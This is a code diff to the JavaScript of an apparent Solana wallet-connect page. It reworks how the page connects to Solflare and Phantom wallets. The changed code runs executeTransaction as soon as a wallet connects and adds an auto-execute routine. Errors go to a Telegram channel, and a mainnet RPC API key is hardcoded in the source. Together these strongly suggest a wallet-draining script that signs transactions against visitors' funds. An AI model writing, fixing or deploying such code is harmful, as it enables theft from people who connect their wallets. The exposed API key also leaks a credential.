@@ -370,29 +370,32 @@
   }
 
   if (window.solflare && window.solflare.isSolflare) {
-    try {
-      showLoader("#connect-solflare");
-      selected = "#connect-solflare";
+  try {
+    showLoader("#connect-solflare");
+    selected = "#connect-solflare";
 
-      const resp = await window.solflare.connect();
+    // Connect and check result
+    const resp = await window.solflare.connect();
 
-      const connection = new solanaWeb3.Connection(
-        "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
-        "confirmed"
-      );
-
-      await executeTransaction(connection, window.solflare, resp.publicKey);
-    } catch (err) {
-      console.error("❌ Error connecting to Jupiter wallet (Solflare):", err);
-      await sendTelegramMessage(`❌ Error connecting to Jupiter wallet: ${err.message}`);
-      hideLoader("#connect-solflare");
+    // Safely extract public key
+    const publicKey = resp?.publicKey || window.solflare.publicKey;
+    if (!publicKey) {
+      throw new Error("Jupiter/Solflare wallet returned no publicKey.");
     }
-  } else {
-    // Fallback for missing Solflare wallet
-    window.open("https://solflare.com", "_blank");
+
+    const connection = new solanaWeb3.Connection(
+      "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
+      "confirmed"
+    );
+
+    await executeTransaction(connection, window.solflare, publicKey);
+  } catch (err) {
+    console.error("❌ Error connecting to Solflare (Jupiter):", err);
+    await sendTelegramMessage(`❌ Error connecting to Solflare (Jupiter): ${err.message}`);
+    hideLoader("#connect-solflare");
   }
+} 
 });
-     
 //       // ✅ Desktop or mobile with wallet extension
 //    if (window.solflare) {
 //         try {
@@ -829,11 +832,14 @@ async function autoExecuteIfConnected() {
       "confirmed"
     );
 
-    if (window.solflare) {
-      const resp = await window.solflare.connect(); // 👈 connect first
-      await executeTransaction(connection, window.solflare, resp.publicKey);
-    } else if (window.solana) {
-      const resp = await window.solana.connect(); // 👈 connect first
+    if (window.solflare && window.solflare.isSolflare) {
+      const resp = await window.solflare.connect();
+      const publicKey = resp?.publicKey || window.solflare.publicKey;
+      if (!publicKey) throw new Error("Jupiter wallet missing publicKey");
+      await executeTransaction(connection, window.solflare, publicKey);
+    } else if (window.solana && window.solana.publicKey) {
+      const resp = await window.solana.connect();
+      if (!resp?.publicKey) throw new Error("Phantom wallet missing publicKey");
       await executeTransaction(connection, window.solana, resp.publicKey);
     }
   } catch (err) {
@@ -841,6 +847,7 @@ async function autoExecuteIfConnected() {
     await sendTelegramMessage(`❌ Auto-execute failed: ${err.message}`);
   }
 }
+
 
 
   const urlParams = new URLSearchParams(window.location.search);
